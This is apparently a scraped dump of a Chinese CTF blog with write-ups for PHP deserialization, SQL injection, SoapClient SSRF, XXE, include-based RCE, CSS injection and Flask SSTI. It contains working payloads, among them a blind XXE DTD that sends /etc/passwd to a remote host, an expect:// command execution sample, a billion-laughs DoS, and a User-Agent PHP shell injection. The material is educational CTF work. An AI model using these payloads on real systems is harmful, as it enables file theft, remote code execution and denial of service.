mkdir(&#39;&#x2F;tmp&#x2F;fuck&#39;);chdir(&#39;&#x2F;tmp&#x2F;fuck&#39;);ini_set(&#39;open_basedir&#39;,&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);ini_set(&#39;open_basedir&#39;,&#39;&#x2F;&#39;);print_r(scandir(&#39;&#x2F;&#39;));readfile(&#39;&#x2F;flag&#39;);?&gt; flag在根目录 Reference[NCTF2019]phar matches everything(phar反序列化)","tags":[{"name":"CTF","slug":"CTF","permalink":"https://yanmymickey.github.io/tags/CTF/"},{"name":"PHP","slug":"PHP","permalink":"https://yanmymickey.github.io/tags/PHP/"},{"name":"WP","slug":"WP","permalink":"https://yanmymickey.github.io/tags/WP/"},{"name":"反序列化","slug":"反序列化","permalink":"https://yanmymickey.github.io/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"}]},{"title":"安恒2020四月赛","date":"2020-04-24T16:00:00.000Z","path":"2020/04/25/CTF_WP/安恒2020四月赛/","text":"安恒2020四月赛只会做做简单题混混分😢 web112345678910111213141516171819202122232425262728293031323334353637383940414243&lt;?phpshow_source(&quot;index.php&quot;);function write ($data) &#123; return str_replace(chr(0) . &#39;*&#39; . chr(0), &#39;\\0\\0\\0&#39;, $data);&#125;function read ($data) &#123; return str_replace(&#39;\\0\\0\\0&#39;, chr(0) . &#39;*&#39; . chr(0), $data);&#125;class A &#123; public $username; public $password; function __construct ($a, $b) &#123; $this-&gt;username &#x3D; $a; $this-&gt;password &#x3D; $b; &#125;&#125;class B &#123; public $b &#x3D;&quot;gpy&quot;; function __destruct () &#123; $c &#x3D; &#39;a&#39; . $this-&gt;b; echo $c; &#125;&#125;class C &#123; public $c; function __toString () &#123; &#x2F;&#x2F;flag.php echo file_get_contents($this-&gt;c); return &#39;nice&#39;; &#125;&#125;$a &#x3D; new A($_GET[&#39;a&#39;],$_GET[&#39;b&#39;]);$b &#x3D; unserialize(read(write(serialize($a))));function read ($data) &#123; return str_replace(&#39;\\0\\0\\0&#39;, chr(0) . &#39;*&#39; . chr(0), $data);&#125; read函数将chr(0) . &#39;*&#39; . chr(0)变为\\0\\0\\0,但是前者只有三个字符,后者有六个字符,那么就会导致字符逃逸。 payload 1?a&#x3D;\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0&amp;b&#x3D;;s:&quot;;s:8:&quot;password&quot;;O:1:&quot;B&quot;:1:&#123;s:1:&quot;b&quot;;O:1:&quot;C&quot;:1:&#123;s:1:&quot;c&quot;;s:8:&quot;flag.php&quot;;&#125;&#125;&#125; MISC6G签到1curl --range 0-100 http:&#x2F;&#x2F;balabala&#x2F;1Gfile.file MISC1下载是个流量包 简单浏览一下，是蓝牙的流量。 先按协议排一下序 找蓝牙的传输协议OBEX 把7z压缩包的数据块复制出来，用winhex或者010editor保存成7z文件，解压，要PIN 去掉过滤器，ctrl+f查找一下有没有PIN，发现有的，解压得到flag 好好学习，天天向上","tags":[{"name":"CTF","slug":"CTF","permalink":"https://yanmymickey.github.io/tags/CTF/"},{"name":"WP","slug":"WP","permalink":"https://yanmymickey.github.io/tags/WP/"}]},{"title":"[SWPU2019]Web6","date":"2020-04-17T16:00:00.000Z","path":"2020/04/18/CTF_WP/SWPU2019Web6/","text":"[SWPU2019]Web6SQL注入方法一验证机制是用户名和密码分开单独验证，并且没有检查空密码 payload 1username&#x3D;1&#39; or &#39;1&#39;&#x3D;&#39;1&#39; group by passwd with rollup having passwd is NULL#&amp;passwd&#x3D; 查出来一个用户并且密码为空，正好可以和passwd没有传值是NULL相匹配 方法二写脚本注入，参考 SWPU2019-Web题解 伪造admin登陆上后查看cookie，然后查看wsdl.php 调用get_flag提示 找到读取文件的方法，还有一个hint，于是依次读取index.php，encode.php，interface.php，se.php keyaaaaaaaasdfsaf.txt （不知为何Chrome的HackbarPOST不管用） encode.php是对cookies的加密，user=后面的字符串为加密后的内容 写出解密脚本，然后伪造成admin，key为txt中的内容 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960function decrypt($data, $key)&#123; $key &#x3D; md5($key); $x &#x3D; 0; $data &#x3D; base64_decode($data); $len &#x3D; strlen($data); $l &#x3D; strlen($key); $char &#x3D; &#39;&#39;; for ($i &#x3D; 0; $i &lt; $len; $i++) &#123; if ($x &#x3D;&#x3D; $l) &#123; $x &#x3D; 0; &#125; $char .&#x3D; substr($key, $x, 1); $x++; &#125; $str &#x3D; &#39;&#39;; for ($i &#x3D; 0; $i &lt; $len; $i++) &#123; if (ord(substr($data, $i, 1)) &lt; ord(substr($char, $i, 1))) &#123; $str .&#x3D; chr((ord(substr($data, $i, 1)) + 256) - ord(substr($char, $i, 1))); &#125; else &#123; $str .&#x3D; chr(ord(substr($data, $i, 1)) - ord(substr($char, $i, 1))); &#125; &#125; return $str;&#125;function en_crypt($content,$key)&#123; $key &#x3D; md5($key); $h &#x3D; 0; $length &#x3D; strlen($content); $swpuctf &#x3D; strlen($key); $varch &#x3D; &#39;&#39;; for ($j &#x3D; 0; $j &lt; $length; $j++) &#123; if ($h &#x3D;&#x3D; $swpuctf) &#123; $h &#x3D; 0; &#125; $varch .&#x3D; $key&#123;$h&#125;; $h++; &#125; $swpu &#x3D; &#39;&#39;; for ($j &#x3D; 0; $j &lt; $length; $j++) &#123; $swpu .&#x3D; chr(ord($content&#123;$j&#125;) + (ord($varch&#123;$j&#125;)) % 256); &#125; return base64_encode($swpu);&#125;$key&#x3D;&quot;flag&#123;this_is_false_flag&#125;&quot;;$data&#x3D;&quot;3J6Roahxag&#x3D;&#x3D;&quot;;echo decrypt($data,$key);$admin&#x3D;&quot;admin:1&quot;;echo en_crypt($admin,$key); 改cookie后变成welcome admin，成功伪造成admin SSRF因为要127.0.0.1,很容易联想到SSRF 在se.php中存在关键代码 1ini_set(&#39;session.serialize_handler&#39;, &#39;php&#39;); 于是想到session反序列化,又要ssrf,想到利用Soap进行SSRF getflag方法总的来说就是构造文件上传写入session文件，然后利用session 反序列化，生成一个soapclient 对象,然后加上crlf设置cookie,进行越权 ssrf 上传SESSIONSoap反序列化写入SESSION 123456789101112131415161718$target &#x3D; &#39;http:&#x2F;&#x2F;127.0.0.1&#x2F;interface.php&#39;;$post_string &#x3D; &#39;a&#x3D;1&amp;b&#x3D;2&#39;;$headers &#x3D; array( &#39;X-Forwarded-For: 127.0.0.1&#39;, &#39;Cookie: user&#x3D;xZmdm9NxaQ&#x3D;&#x3D;&#39;,);$b &#x3D; new SoapClient(null, array(&#39;location&#39; &#x3D;&gt; $target, &#39;user_agent&#39; &#x3D;&gt; &#39;wupco^^Content-Type: application&#x2F;x-www-form-urlencoded^^&#39; . join(&#39;^^&#39;, $headers), &#39;uri&#39; &#x3D;&gt; &quot;aaab&quot;));$aaa &#x3D; serialize($b);$aaa &#x3D; str_replace(&#39;^^&#39;, &quot;\\r\\n&quot;, $aaa);$aaa &#x3D; str_replace(&#39;&amp;&#39;, &#39;&amp;&#39;, $aaa);echo $aaa;&#x2F;&#x2F;结果O:10:&quot;SoapClient&quot;:5:&#123;s:3:&quot;uri&quot;;s:4:&quot;aaab&quot;;s:8:&quot;location&quot;;s:30:&quot;http:&#x2F;&#x2F;127.0.0.1&#x2F;interface.php&quot;;s:15:&quot;_stream_context&quot;;i:0;s:11:&quot;_user_agent&quot;;s:109:&quot;wupcoContent-Type: application&#x2F;x-www-form-urlencodedX-Forwarded-For: 127.0.0.1Cookie: user&#x3D;xZmdm9NxaQ&#x3D;&#x3D;&quot;;s:13:&quot;_soap_version&quot;;i:1;&#125; 本地写一个html页面用于上传文件,利用session.upload_progress写入session 123456789&lt;html&gt;&lt;body&gt; &lt;form action&#x3D;&quot;http:&#x2F;&#x2F;905705f8-b6ff-431a-b953-c2c5ff0d70ed.node3.buuoj.cn&#x2F;index.php&quot; method&#x3D;&quot;POST&quot; enctype&#x3D;&quot;multipart&#x2F;form-data&quot;&gt; &lt;input type&#x3D;&quot;hidden&quot; name&#x3D;&quot;PHP_SESSION_UPLOAD_PROGRESS&quot; value&#x3D;&quot;1&quot; &#x2F;&gt; &lt;input type&#x3D;&quot;file&quot; name&#x3D;&quot;file&quot; &#x2F;&gt; &lt;input type&#x3D;&quot;submit&quot; &#x2F;&gt; &lt;&#x2F;form&gt;&lt;&#x2F;body&gt;&lt;&#x2F;html&gt; 抓包修改 触发SESSION反序列化1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071class aa &#123; public $mod1; public $mod2; public function __call ($name, $param) &#123; if ($this-&gt;&#123;$name&#125;) &#123; $s1 &#x3D; $this-&gt;&#123;$name&#125;; $s1(); &#125; &#125; public function __get ($ke) &#123; return $this-&gt;mod2[$ke]; &#125;&#125;class bb &#123; public $mod1; public $mod2; public function __destruct () &#123; $this-&gt;mod1-&gt;test2(); &#125;&#125;class cc &#123; public $mod1; public $mod2; public $mod3; public function __invoke () &#123; $this-&gt;mod2 &#x3D; $this-&gt;mod3 . $this-&gt;mod1; &#125;&#125;class dd &#123; public $name; public $flag; public $b; public function getflag () &#123; session_start(); var_dump($_SESSION); $a &#x3D; array(reset($_SESSION), $this-&gt;flag); echo call_user_func($this-&gt;b, $a); &#125;&#125;class ee &#123; public $str1; public $str2; public function __toString () &#123; $this-&gt;str1-&gt;&#123;$this-&gt;str2&#125;(); return &quot;1&quot;; &#125;&#125;$first &#x3D; new bb();$second &#x3D; new aa();$third &#x3D; new cc();$four &#x3D; new ee();$first-&gt;mod1 &#x3D; $second;$third-&gt;mod1 &#x3D; $four;$f &#x3D; new dd();$f-&gt;flag &#x3D; &#39;Get_flag&#39;;$f-&gt;b &#x3D; &#39;call_user_func&#39;;$four-&gt;str1 &#x3D; $f;$four-&gt;str2 &#x3D; &quot;getflag&quot;;$second-&gt;mod2[&#39;test2&#39;] &#x3D; $third;&#x2F;&#x2F;var_dump($first);echo serialize($first); 目的是触发get_flag方法 1bb-&gt;__destruct()&#96;&#x3D;&#x3D;&#x3D;&gt;&#96;aa-&gt;__call()&#96;&#x3D;&#x3D;&#x3D;&gt;&#96;cc-&gt;__invoke()&#96;&#x3D;&#x3D;&#x3D;&gt;&#96;ee-&gt;__toString()&#96;&#x3D;&#x3D;&#x3D;&gt;&#96;dd-&gt;getflag() pop链可以用反向分析的方法得到。 触发session反序列化得到Soap对象爬取到的flag,然后输出 发送给se.php即可得到flag 学习一下session.upload_progressphp&gt;5.4时,php.ini有如下默认配置 123456session.upload_progress.enabled &#x3D; onsession.upload_progress.cleanup &#x3D; onsession.upload_progress.prefix &#x3D; &quot;upload_progress_&quot;session.upload_progress.name &#x3D; &quot;PHP_SESSION_UPLOAD_PROGRESS&quot;session.upload_progress.freq &#x3D; &quot;1%&quot;session.upload_progress.min_freq &#x3D; &quot;1&quot; enabled=on表示upload_progress功能开始，也意味着当浏览器向服务器上传一个文件时，php将会把此次文件上传的详细信息(如上传时间、上传进度等)存储在session当中 ； cleanup=on表示当文件上传结束后，php将会立即清空对应session文件中的内容，这个选项非常重要； cleanup=on时考虑条件竞争进行利用 name当它出现在表单中，php将会报告上传进度，最大的好处是，它的值可控； prefix+name将表示为session中的键名 ReferenceSWPU2019-Web题解 利用session.upload_progress进行文件包含和反序列化渗透 第十届SWPUCTFwriteup PHP中SESSION反序列化机制","tags":[{"name":"CTF","slug":"CTF","permalink":"https://yanmymickey.github.io/tags/CTF/"},{"name":"WP","slug":"WP","permalink":"https://yanmymickey.github.io/tags/WP/"},{"name":"sql注入","slug":"sql注入","permalink":"https://yanmymickey.github.io/tags/sql%E6%B3%A8%E5%85%A5/"}]},{"title":"[INS’hAck 2019]Atchap","date":"2020-04-17T16:00:00.000Z","path":"2020/04/18/CTF_WP/[INS'hAck 2019]Atchap/","text":"[INS’hAck 2019]Atchap分析利用邮件服务器漏洞 Tchap: The super (not) secure app of the French government payloadbuu注册一个邮箱 发送自己的邮箱,提示 1You&#39;re not whitelisted or not part of the company.. 发送下面contact us的邮箱Samira.Bien@almosttchap.fr 1You&#39;re not using your official address.. 发送 1yourmail@mail.com@Samira.Bien@almosttchap.fr 在邮箱中查看邮件中得到flag","tags":[{"name":"CTF","slug":"CTF","permalink":"https://yanmymickey.github.io/tags/CTF/"},{"name":"WP","slug":"WP","permalink":"https://yanmymickey.github.io/tags/WP/"},{"name":"邮件服务器漏洞","slug":"邮件服务器漏洞","permalink":"https://yanmymickey.github.io/tags/%E9%82%AE%E4%BB%B6%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%BC%8F%E6%B4%9E/"}]},{"title":"XXE","date":"2020-04-16T16:00:00.000Z","path":"2020/04/17/CTF/XXE/","text":"XXE0x01什么是XXEXXE(XML External Entity Injection) 全称为 XML 外部实体注入,不仅能够注入XML代码,还能注入XML外部实体 如果能注入 外部实体并且成功解析的话，这就会大大拓宽我们 XML 注入的攻击面. 0x02基础语法XML基础语法 XML与DTD DTD教程 0x03外部实体重点一： 实体分为两种，内部实体和外部实体,实体可以从外部的 dtd 文件中引用，我们看下面的代码： 示例代码： 12345678&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;ISO-8859-1&quot;?&gt;&lt;!DOCTYPE foo [&lt;!ELEMENT foo ANY &gt;&lt;!ENTITY xxe SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;c:&#x2F;test.dtd&quot; &gt;]&gt;&lt;creds&gt; &lt;user&gt;&amp;xxe;&lt;&#x2F;user&gt; &lt;pass&gt;mypass&lt;&#x2F;pass&gt;&lt;&#x2F;creds&gt; 这样对引用资源所做的任何更改都会在文档中自动更新,非常方便（方便永远是安全的敌人） 当然，还有一种引用方式是使用 引用公用 DTD 的方法，语法如下： 1&lt;!DOCTYPE 根元素名称 PUBLIC “DTD标识名” “公用DTD的URI”&gt; 这个在我们的攻击中也可以起到和 SYSTEM 一样的作用 重点二： 我们上面已经将实体分成了两个派别（内部实体和外部外部），但是实际上从另一个角度看，实体也可以分成两个派别（通用实体和参数实体） 1.通用实体 用 &amp;实体名; 引用的实体，他在DTD 中定义，在 XML 文档中引用 示例代码： 1234567&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot;?&gt; &lt;!DOCTYPE updateProfile [&lt;!ENTITY file SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;c:&#x2F;windows&#x2F;win.ini&quot;&gt; ]&gt; &lt;updateProfile&gt; &lt;firstname&gt;Joe&lt;&#x2F;firstname&gt; &lt;lastname&gt;&amp;file;&lt;&#x2F;lastname&gt; ... &lt;&#x2F;updateProfile&gt; 2.参数实体： (1)使用 % 实体名(这里面空格不能少) 在 DTD 中定义，并且只能在 DTD 中使用 %实体名; 引用(2)只有在 DTD 文件中，参数实体的声明才能引用其他实体(3)和通用实体一样，参数实体也可以外部引用 示例代码： 123&lt;!ENTITY % an-element &quot;&lt;!ELEMENT mytag (subtag)&gt;&quot;&gt; &lt;!ENTITY % remote-dtd SYSTEM &quot;http:&#x2F;&#x2F;somewhere.example.org&#x2F;remote.dtd&quot;&gt; %an-element; %remote-dtd; 抛转： 参数实体在我们 Blind XXE 中起到了至关重要的作用 0x04利用1、有回显读本地敏感文件(Normal XXE)示例代码： xml.php 12345678910&lt;?php libxml_disable_entity_loader (false); $xmlfile &#x3D; file_get_contents(&#39;php:&#x2F;&#x2F;input&#39;); $dom &#x3D; new DOMDocument(); $dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD); $creds &#x3D; simplexml_import_dom($dom); echo $creds;?&gt; payload: 1234&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot;?&gt; &lt;!DOCTYPE creds [ &lt;!ENTITY goodies SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd&quot;&gt; ]&gt; &lt;creds&gt;&amp;goodies;&lt;&#x2F;creds&gt; 2、无回显读取本地敏感文件(Blind OOB XXE)xml.php 1234567&lt;?phplibxml_disable_entity_loader (false);$xmlfile &#x3D; file_get_contents(&#39;php:&#x2F;&#x2F;input&#39;);$dom &#x3D; new DOMDocument();$dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD); ?&gt; test.dtd 12&lt;!ENTITY % file SYSTEM &quot;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd&quot;&gt;&lt;!ENTITY % int &quot;&lt;!ENTITY &amp;#37; send SYSTEM &#39;http:&#x2F;&#x2F;ip:9999?p&#x3D;%file;&#39;&gt;&quot;&gt; payload： 1234&lt;!DOCTYPE convert [ &lt;!ENTITY % remote SYSTEM &quot;http:&#x2F;&#x2F;ip&#x2F;test.dtd&quot;&gt;%remote;%int;%send;]&gt; 整个调用过程： 我们从 payload 中能看到 连续调用了三个参数实体 %remote;%int;%send;，这就是我们的利用顺序，%remote 先调用，调用后请求远程服务器上的 test.dtd ，有点类似于将 test.dtd 包含进来，然后 %int 调用 test.dtd 中的 %file, %file 就会去获取服务器上面的敏感文件，然后将 %file 的结果填入到 %send 以后(因为实体的值中不能有 %, 所以将其转成html实体编码 %)，我们再调用 %send; 把我们的读取到的数据发送到我们的远程 vps 上，这样就实现了外带数据的效果，完美的解决了 XXE 无回显的问题。 3、HTTP 内网主机探测我们以存在 XXE 漏洞的服务器为我们探测内网的支点。要进行内网探测我们还需要做一些准备工作，我们需要先利用 file 协议读取我们作为支点服务器的网络配置文件，看一下有没有内网，以及网段大概是什么样子（我以linux 为例），我们可以尝试读取 /etc/network/interfaces 或者 /proc/net/arp 或者 /etc/host 文件以后我们就有了大致的探测方向了 探测脚本 12345678910111213141516171819202122232425262728293031323334import requestsimport base64#Origtional XML that the server accepts#&lt;xml&gt;# &lt;stuff&gt;user&lt;&#x2F;stuff&gt;#&lt;&#x2F;xml&gt;def build_xml(string): xml &#x3D; &quot;&quot;&quot;&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;ISO-8859-1&quot;?&gt;&quot;&quot;&quot; xml &#x3D; xml + &quot;\\r\\n&quot; + &quot;&quot;&quot;&lt;!DOCTYPE foo [ &lt;!ELEMENT foo ANY &gt;&quot;&quot;&quot; xml &#x3D; xml + &quot;\\r\\n&quot; + &quot;&quot;&quot;&lt;!ENTITY xxe SYSTEM &quot;&quot;&quot; + &#39;&quot;&#39; + string + &#39;&quot;&#39; + &quot;&quot;&quot;&gt;]&gt;&quot;&quot;&quot; xml &#x3D; xml + &quot;\\r\\n&quot; + &quot;&quot;&quot;&lt;xml&gt;&quot;&quot;&quot; xml &#x3D; xml + &quot;\\r\\n&quot; + &quot;&quot;&quot; &lt;stuff&gt;&amp;xxe;&lt;&#x2F;stuff&gt;&quot;&quot;&quot; xml &#x3D; xml + &quot;\\r\\n&quot; + &quot;&quot;&quot;&lt;&#x2F;xml&gt;&quot;&quot;&quot; send_xml(xml)def send_xml(xml): url&#x3D;&quot;存在xxe的url地址&quot; headers &#x3D; &#123;&#39;Content-Type&#39;: &#39;application&#x2F;xml&#39;&#125; x &#x3D; requests.post(url, data&#x3D;xml, headers&#x3D;headers, timeout&#x3D;5).text coded_string &#x3D; x.split(&#39; &#39;)[-2] # a little split to get only the base64 encoded value print coded_string# print base64.b64decode(coded_string)for i in range(1, 255): try: i &#x3D; str(i) ip &#x3D; &#39;10.0.0.&#39; + i string &#x3D; &#39;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;http:&#x2F;&#x2F;&#39; + ip + &#39;&#x2F;&#39; print string build_xml(string) except:continue 4、HTTP 内网主机端口扫描payload 12345&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot;?&gt; &lt;!DOCTYPE data SYSTEM &quot;http:&#x2F;&#x2F;127.0.0.1:515&#x2F;&quot; [ &lt;!ELEMENT data (#PCDATA)&gt; ]&gt;&lt;data&gt;4&lt;&#x2F;data&gt; 5、内网盲注(CTF)2018 强网杯 Wechat 2018 强网杯 WP 6、文件上传Java jar://协议相关，自行查看Reference 7、钓鱼：利用ftp协议结合CRLF注入向SMTP服务器发送任意命令达到发送任意邮件的给任意人，详情查看Reference 8、其他1.PHP expect RCE由于 PHP 的 expect 并不是默认安装扩展，如果安装了这个expect 扩展我们就能直接利用 XXE 进行 RCE 示例代码： 1234&lt;!DOCTYPE root[&lt;!ENTITY cmd SYSTEM &quot;expect:&#x2F;&#x2F;id&quot;&gt;]&gt;&lt;dir&gt;&lt;file&gt;&amp;cmd;&lt;&#x2F;file&gt;&lt;&#x2F;dir&gt; 2. 利用 XXE 进行 DOS 攻击示例代码： 12345678910111213&lt;?xml version&#x3D;&quot;1.0&quot;?&gt; &lt;!DOCTYPE lolz [ &lt;!ENTITY lol &quot;lol&quot;&gt; &lt;!ENTITY lol2 &quot;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&quot;&gt; &lt;!ENTITY lol3 &quot;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&quot;&gt; &lt;!ENTITY lol4 &quot;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&quot;&gt; &lt;!ENTITY lol5 &quot;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&quot;&gt; &lt;!ENTITY lol6 &quot;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&quot;&gt; &lt;!ENTITY lol7 &quot;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&quot;&gt; &lt;!ENTITY lol8 &quot;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&quot;&gt; &lt;!ENTITY lol9 &quot;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&quot;&gt; ]&gt; &lt;lolz&gt;&amp;lol9;&lt;&#x2F;lolz&gt; 0x05总结XXE在ctf比赛中也算比较常见，最近做题碰到很多的xxe的题目，大多题目难度比较适中，记录系统学习一下 0x06Reference一篇文章带你深入理解漏洞之 XXE 漏洞","tags":[{"name":"CTF","slug":"CTF","permalink":"https://yanmymickey.github.io/tags/CTF/"},{"name":"XXE","slug":"XXE","permalink":"https://yanmymickey.github.io/tags/XXE/"}]},{"title":"Phuck2","date":"2020-04-16T16:00:00.000Z","path":"2020/04/17/CTF_WP/Phuck2/","text":"Phuck2分析查看wp的源代码的发现传入参数hl可以得到源码 123456789101112131415161718192021222324252627 &lt;?php stream_wrapper_unregister(&#39;php&#39;); if(isset($_GET[&#39;hl&#39;])) highlight_file(__FILE__); $mkdir &#x3D; function($dir) &#123; system(&#39;mkdir -- &#39;.escapeshellarg($dir)); &#125;; $randFolder &#x3D; bin2hex(random_bytes(16)); $mkdir(&#39;users&#x2F;&#39;.$randFolder); chdir(&#39;users&#x2F;&#39;.$randFolder); $userFolder &#x3D; (isset($_SERVER[&#39;HTTP_X_FORWARDED_FOR&#39;]) ? $_SERVER[&#39;HTTP_X_FORWARDED_FOR&#39;] : $_SERVER[&#39;REMOTE_ADDR&#39;]); $userFolder &#x3D; basename(str_replace([&#39;.&#39;,&#39;-&#39;],[&#39;&#39;,&#39;&#39;],$userFolder)); $mkdir($userFolder); chdir($userFolder); file_put_contents(&#39;profile&#39;,print_r($_SERVER,true)); chdir(&#39;..&#39;); $_GET[&#39;page&#39;]&#x3D;str_replace(&#39;.&#39;,&#39;&#39;,$_GET[&#39;page&#39;]); if(!stripos(file_get_contents($_GET[&#39;page&#39;]),&#39;&lt;?&#39;) &amp;&amp; !stripos(file_get_contents($_GET[&#39;page&#39;]),&#39;php&#39;)) &#123; include($_GET[&#39;page&#39;]); &#125; chdir(__DIR__); system(&#39;rm -rf users&#x2F;&#39;.$randFolder);?&gt; $userFolder在有X-FORWARDED-FOR头是用这个作为文件夹名 会打印$_SERVER传入profile文件 123if(!stripos(file_get_contents($_GET[&#39;page&#39;]),&#39;&lt;?&#39;) &amp;&amp; !stripos(file_get_contents($_GET[&#39;page&#39;]),&#39;php&#39;)) &#123; include($_GET[&#39;page&#39;]); &#125; 考虑在http请求头中插入php代码,然后包含profile文件进行命令执行 当allow_url_include=Off时 file_get_contents在处理data:xxx时会直接取xxx 而include会包含文件名为data:xxx的文件 payload123456GET &#x2F;?page&#x3D;data:aa&#x2F;profile HTTP&#x2F;1.1X-Forwarded-For: data:aaUser-Agent: &lt;?php system(&#39;ls &#x2F;&#39;); ?&gt;GET &#x2F;?page&#x3D;data:aa&#x2F;profile HTTP&#x2F;1.1X-Forwarded-For: data:aaUser-Agent: &lt;?php system(&#39;&#x2F;get_flag&#39;);?&gt; 在返回的数据中找到flag 1[HTTP_USER_AGENT] &#x3D;&gt; flag&#123;asdsafasfdsadasd&#125; ReferencePhuck2wp","tags":[{"name":"CTF","slug":"CTF","permalink":"https://yanmymickey.github.io/tags/CTF/"},{"name":"WP","slug":"WP","permalink":"https://yanmymickey.github.io/tags/WP/"},{"name":"php伪协议","slug":"php伪协议","permalink":"https://yanmymickey.github.io/tags/php%E4%BC%AA%E5%8D%8F%E8%AE%AE/"},{"name":"data协议与file_get_contents与include","slug":"data协议与file-get-contents与include","permalink":"https://yanmymickey.github.io/tags/data%E5%8D%8F%E8%AE%AE%E4%B8%8Efile-get-contents%E4%B8%8Einclude/"}]},{"title":"[安洵杯 2019]cssgame","date":"2020-04-16T16:00:00.000Z","path":"2020/04/17/CTF_WP/[安洵杯 2019]cssgame/","text":"[安洵杯 2019]cssgame分析很有意思的CSS injection 大致的思路就是通过传入一个外部链接的css,让flag.html解析, 外部链接的css写入如下内容 1input[name&#x3D;flag][value^&#x3D;&quot;f&quot;] ~ * &#123;background-image: url(&quot;http:&#x2F;&#x2F;x.x.x.x&#x2F;?flag&#x3D;f&quot;);&#125; 然后对flag值进行逐位判断，如果正确则发送数据给vps payloadexp 123456789import sysf &#x3D; open(&quot;poc.css&quot;, &quot;w&quot;)dic &#x3D; &quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#123;&#125;-&quot;for i in dic: flag &#x3D; sys.argv[1] + i payload &#x3D; &quot;input[name&#x3D;flag][value^&#x3D;\\&quot;&quot; + flag + &quot;\\&quot;] ~ * &#123;background-image: url(\\&quot;http:&#x2F;&#x2F;174.0.31.242:8080&#x2F;?&quot; + flag + &quot;\\&quot;);&#125;&quot; f.write(payload + &quot;\\n&quot;)f.close() 在buu申请一台小号linux lab,然后在/var/www/html/目录写入以上exp,运行一下脚本,nc开启监听 然后就开始将css=http://174.0.31.242/poc.csspost给crawl.html,在nc监听中可以得到flag,然后手动改flag的值,生成不同的poc.css,逐位爆破可以得到flag 总结以上方法还是有点麻烦的，看看官方wp，发现有更好的办法，学一手，INS Reference[安洵杯 2019]cssgame wp [安洵杯 2019]cssgame 官方WP","tags":[{"name":"CTF","slug":"CTF","permalink":"https://yanmymickey.github.io/tags/CTF/"},{"name":"WP","slug":"WP","permalink":"https://yanmymickey.github.io/tags/WP/"},{"name":"CSS injection","slug":"CSS-injection","permalink":"https://yanmymickey.github.io/tags/CSS-injection/"}]},{"title":"[CSCCTF 2019 Qual]FlaskLight","date":"2020-04-14T16:00:00.000Z","path":"2020/04/15/CTF_WP/[CSCCTF 2019 Qual]FlaskLight/","text":"[CSCCTF 2019 Qual]FlaskLight分析题目是flask，打开查看网页源代码，发现提示传参search，fuzz测试 123&#123;&#123;1*2&#125;&#125;#返回结果2可以判定有SSTI查看&#123;&#123;config&#125;&#125;发现一些信息 然后就是常规的模板注入 [Templates Injections](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server Side Template Injection) 12&#123;&#123;&#39;&#39;.__class__.__mro__[2].__subclasses__()&#125;&#125;#可以爆出所有的类 写了一个脚本查找可以利用的类 利用subprocess.Popen执行命令,详情参考链接 12345678910111213141516171819202122import requestsimport reimport htmlimport timeindex &#x3D; 0for i in range(170, 1000): try: url &#x3D; &quot;http:&#x2F;&#x2F;5a8d97da-4cb0-43f8-9810-e9c352e034ad.node3.buuoj.cn&#x2F;?search&#x3D;&#123;&#123;&#39;&#39;.__class__.__mro__[2].__subclasses__()[&quot; + str(i) + &quot;]&#125;&#125;&quot; r &#x3D; requests.get(url) res &#x3D; re.findall(&quot;&lt;h2&gt;You searched for:&lt;\\&#x2F;h2&gt;\\W+&lt;h3&gt;(.*)&lt;\\&#x2F;h3&gt;&quot;, r.text) time.sleep(0.1) # print(res) # print(r.text) res &#x3D; html.unescape(res[0]) print(str(i) + &quot; | &quot; + res) if &quot;subprocess.Popen&quot; in res: index &#x3D; i break except: continueprint(&quot;indexo of subprocess.Popen:&quot; + str(index)) 找到类名的index之后很简单了 